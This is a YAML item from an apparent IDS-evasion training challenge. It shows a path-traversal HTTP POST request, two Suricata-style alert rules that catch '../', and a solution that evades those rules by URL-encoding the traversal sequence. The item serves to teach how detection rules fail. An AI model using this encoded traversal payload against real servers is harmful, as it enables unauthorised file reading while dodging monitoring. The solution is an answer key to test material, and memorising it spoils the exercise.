name: 'Path Traversal (Param) 3'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Fetch /var/www/html/picture.php**

hints: []

target: sighting

base_request: |-
  POST /picture.php? HTTP/1.1
  Host: localhost
  Content-Length: 50
  Content-Type: application/x-www-form-urlencoded

  file=../../../../../../../var/www/html/picture.php

solution: |-
  POST /picture.php? HTTP/1.1
  Host: localhost
  Content-Length: 83
  Content-Type: application/x-www-form-urlencoded

  file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fvar/www/html/picture.php

solution_note: Missing url_decode

rules:
# POST w/o URLDecode
  - >
    alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "/picture.php"; content: "../"; sid:123456; rev:1;)
  - >
    alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.uri; content: "/picture.php"; http.request_body; content: "../"; sid:123457; rev:1;)

expected_output: "mime_content_type"
